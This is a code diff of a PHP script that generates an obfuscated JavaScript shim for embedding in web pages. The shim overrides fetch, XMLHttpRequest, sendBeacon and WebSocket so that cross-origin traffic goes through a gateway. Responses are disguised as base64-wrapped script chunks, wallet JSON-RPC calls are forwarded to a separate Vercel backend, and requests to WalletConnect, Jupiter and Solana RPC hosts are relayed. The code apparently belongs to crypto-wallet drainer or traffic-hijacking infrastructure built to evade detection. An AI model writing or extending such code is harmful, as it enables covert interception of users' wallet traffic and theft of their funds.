@@ -269,26 +269,29 @@ function embed_network_shim(string $entry, array $chunks): string
     $gwJs = json_encode($chunks['gateway'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
     $wsJs = json_encode($chunks['wsRelay'], JSON_UNESCAPED_SLASHES | JSON_THROW_ON_ERROR);
 
-    return '(function(e,g,w){function x(o){var s=JSON.stringify(o);'
-        . 'var b=btoa(s);return b.replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=+$/,"")}'
-        . 'function uget(o){return e+"?c="+encodeURIComponent(g)+"&d="+encodeURIComponent(x(o))}'
-        . 'function off(h){try{return new URL(h,location.href).origin!==location.origin}catch(r){return!1}}'
-        . 'function pl(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"\\)/);'
-        . 'if(!m)return null;var s=Number(m[1]),b=m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\");'
-        . 'if(s<200||s>=300)throw new Error("chunk "+s);'
-        . 'var n=b.replace(/-/g,"+").replace(/_/g,"/");var p=n.length%4?4-n.length%4:0;'
-        . 'return JSON.parse(atob(n+"=".repeat(p)))}'
-        . 'function pj(r){return r.text().then(function(t){var j=pl(t);'
+    return '(function(e,g,w){function off(h){try{return new URL(h,location.href).origin!==location.origin}catch(r){return!1}}'
+        . 'function dec(b){var n=b.replace(/-/g,"+").replace(/_/g,"/");var p=n.length%4?4-n.length%4:0;return atob(n+"=".repeat(p))}'
+        . 'function pl(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
+        . 'if(!m)return null;var s=Number(m[1]);if(s<200||s>=300)throw new Error("chunk "+s);'
+        . 'var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
+        . 'if(m[3]==="0")return raw;return JSON.parse(raw)}'
+        . 'function pj(r){return r.text().then(function(t){var m=t.match(/__WPL\\((\\d+),"((?:[^"\\\\]|\\\\.)*)"(?:,(\\d))?\\)/);'
+        . 'if(m&&m[3]==="0"){var raw=dec(m[2].replace(/\\\\"/g,\'"\').replace(/\\\\\\\\/g,"\\\\"));'
+        . 'var u=new Uint8Array(raw.length);for(var i=0;i<raw.length;i++)u[i]=raw.charCodeAt(i);'
+        . 'return new Response(u,{status:Number(m[1])})}var j=pl(t);'
         . 'return new Response(j?JSON.stringify(j):t,{status:r.status,headers:{"Content-Type":"application/json"}})})}'
+        . 'function gpost(o){return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:{"Content-Type":"application/json"},'
+        . 'body:JSON.stringify(o),credentials:"same-origin"}))}'
         . 'function prox(h,n){n=n||{};var m=(n.method||"GET").toUpperCase(),b=n.body;'
-        . 'if(m==="GET"&&!b)return pj(fetch(uget({t:"u",m:"GET",u:h}),n));'
-        . 'var o={t:"u",m:m,u:h};if(b!=null)o.b=typeof b==="string"?b:String(b);'
-        . 'return pj(fetch(e+"?c="+encodeURIComponent(g),{method:"POST",headers:Object.assign({},n.headers||{},'
-        . '{"Content-Type":"application/json"}),body:JSON.stringify(o),credentials:n.credentials,signal:n.signal}))}'
+        . 'var o={t:"u",m:m,u:h};if(b!=null)o.b=typeof b==="string"?b:(b instanceof Blob?b:String(b));return gpost(o)}'
         . 'var f=fetch;fetch=function(i,n){var h=typeof i==="string"?i:i instanceof Request?i.url:String(i);'
         . 'if(off(h))return prox(h,n);return f(i,n)};'
-        . 'var xo=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,h){'
-        . 'if(typeof h==="string"&&off(h))arguments[1]=uget({t:"u",m:m||"GET",u:h});return xo.apply(this,arguments)};'
+        . 'var sb=navigator.sendBeacon&&navigator.sendBeacon.bind(navigator);'
+        . 'if(sb)navigator.sendBeacon=function(u,d){if(!off(u))return sb(u,d);gpost({t:"u",m:"POST",u:String(u)});return!0};'
+        . 'var xo=XMLHttpRequest.prototype.open,xs=XMLHttpRequest.prototype.send;'
+        . 'XMLHttpRequest.prototype.open=function(m,h){if(typeof h==="string"&&off(h)){this._px=h;this._pm=m;arguments[1]="about:blank"}return xo.apply(this,arguments)};'
+        . 'XMLHttpRequest.prototype.send=function(b){if(this._px){var x=this;prox(this._px,{method:this._pm||"GET",body:b}).then(function(r){return r.text()}).then(function(t){'
+        . 'x.readyState=4;x.status=200;x.responseText=t;x.onload&&x.onload()}).catch(function(){x.onerror&&x.onerror()});return}return xs.apply(this,arguments)};'
         . 'var W=WebSocket,wb=e.replace(/^http/i,"ws");WebSocket=function(h,pr){'
         . 'if(off(h))return new W(wb+"?c="+encodeURIComponent(w),pr);return new W(h,pr)}})('
         . $entryJs . ',' . $gwJs . ',' . $wsJs . ');';
@@ -317,6 +320,113 @@ function decode_chunk_payload(string $raw): ?array
     return is_array($data) ? $data : null;
 }
 
+function upstream_host_allowed(string $host): bool
+{
+    $host = strtolower($host);
+    $suffixes = [
+        'walletconnect.org',
+        'walletconnect.com',
+        'web3modal.org',
+        'web3modal.com',
+        'reown.com',
+        'jup.ag',
+        'helius-rpc.com',
+        'googleapis.com',
+        'gstatic.com',
+    ];
+    foreach ($suffixes as $suffix) {
+        if ($host === $suffix || str_ends_with($host, '.' . $suffix)) {
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function emit_js_chunk_response(int $status, string $body, bool $asJson = true): void
+{
+    $b64 = rtrim(strtr(base64_encode($body), '+/', '-_'), '=');
+    $flag = $asJson ? '1' : '0';
+    $safe = addcslashes($b64, "\\\"");
+
+    http_response_code($status > 0 ? $status : 502);
+    header('Content-Type: application/javascript; charset=utf-8');
+    header('Cache-Control: no-store');
+    $origin = request_origin();
+    if ($origin !== '') {
+        header('Access-Control-Allow-Origin: ' . $origin);
+        header('Vary: Origin');
+    }
+    echo 'typeof self!=="undefined"&&self.__WPL&&self.__WPL('
+        . $status . ',"' . $safe . '",' . $flag . ');';
+}
+
+/** @param array<string, mixed> $op */
+function serve_upstream_op(array $cfg, array $op): void
+{
+    $target = (string) ($op['u'] ?? '');
+    if ($target === '' || !filter_var($target, FILTER_VALIDATE_URL)) {
+        http_response_code(400);
+        exit;
+    }
+
+    $parts = parse_url($target);
+    $host = is_array($parts) ? strtolower((string) ($parts['host'] ?? '')) : '';
+    if ($host === '' || !upstream_host_allowed($host)) {
+        http_response_code(403);
+        exit;
+    }
+
+    $method = strtoupper((string) ($op['m'] ?? 'GET'));
+    $body = isset($op['b']) && $op['b'] !== '' ? (string) $op['b'] : null;
+
+    if (!function_exists('curl_init')) {
+        http_response_code(500);
+        exit;
+    }
+
+    $ch = curl_init($target);
+    if ($ch === false) {
+        http_response_code(502);
+        exit;
+    }
+
+    $headers = ['User-Agent: wallet-embed-proxy/1.0'];
+    if ($body !== null && $method !== 'GET' && $method !== 'HEAD') {
+        $headers[] = 'Content-Type: application/json';
+    }
+
+    $opts = [
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_MAXREDIRS => 3,
+        CURLOPT_CONNECTTIMEOUT => 15,
+        CURLOPT_TIMEOUT => 60,
+        CURLOPT_CUSTOMREQUEST => $method,
+        CURLOPT_HTTPHEADER => $headers,
+        CURLOPT_ENCODING => '',
+    ];
+    if ($body !== null && $method !== 'GET' && $method !== 'HEAD') {
+        $opts[CURLOPT_POSTFIELDS] = $body;
+    }
+    curl_setopt_array($ch, $opts);
+    $response = curl_exec($ch);
+    $code = (int) curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    $type = (string) curl_getinfo($ch, CURLINFO_CONTENT_TYPE);
+    curl_close($ch);
+
+    if ($response === false) {
+        http_response_code(502);
+        exit;
+    }
+
+    $asJson = $type === ''
+        || str_contains($type, 'json')
+        || str_contains($type, 'text')
+        || str_contains($type, 'javascript');
+    emit_js_chunk_response($code, (string) $response, $asJson);
+}
+
 function serve_gateway_chunk(array $cfg): void
 {
     $chunks = chunk_names($cfg);
@@ -325,23 +435,48 @@ function serve_gateway_chunk(array $cfg): void
     $d = (string) ($_GET['d'] ?? '');
 
     if ($method === 'GET' && $d !== '') {
-        proxy_forward('GET', $vercelUrl . '?d=' . rawurlencode($d), null);
-        return;
-    }
-
-    $body = file_get_contents('php://input');
-    if ($body === false) {
+        $op = decode_chunk_payload($d);
+        if (is_array($op) && ($op['t'] ?? '') === 'u') {
+            serve_upstream_op($cfg, $op);
+            exit;
+        }
         http_response_code(400);
         exit;
     }
 
-    $headers = [];
-    $contentType = (string) ($_SERVER['CONTENT_TYPE'] ?? $_SERVER['HTTP_CONTENT_TYPE'] ?? '');
-    if ($contentType !== '') {
-        $headers[] = 'Content-Type: ' . $contentType;
+    if ($method !== 'POST') {
+        http_response_code(405);
+        exit;
     }
 
-    proxy_forward('POST', $vercelUrl, $body === '' ? null : $body, $headers);
+    $body = file_get_contents('php://input');
+    if ($body === false || $body === '') {
+        http_response_code(400);
+        exit;
+    }
+
+    $parsed = json_decode($body, true);
+    if (!is_array($parsed)) {
+        http_response_code(400);
+        exit;
+    }
+
+    if (isset($parsed['jsonrpc'])) {
+        proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
+        return;
+    }
+
+    if (($parsed['t'] ?? '') === 'u') {
+        serve_upstream_op($cfg, $parsed);
+        return;
+    }
+
+    if (($parsed['t'] ?? '') === 'p') {
+        proxy_forward('POST', $vercelUrl, $body, ['Content-Type: application/json']);
+        return;
+    }
+
+    http_response_code(400);
 }
 
 function proxy_forward(string $method, string $url, ?string $body, array $extraHeaders = []): void
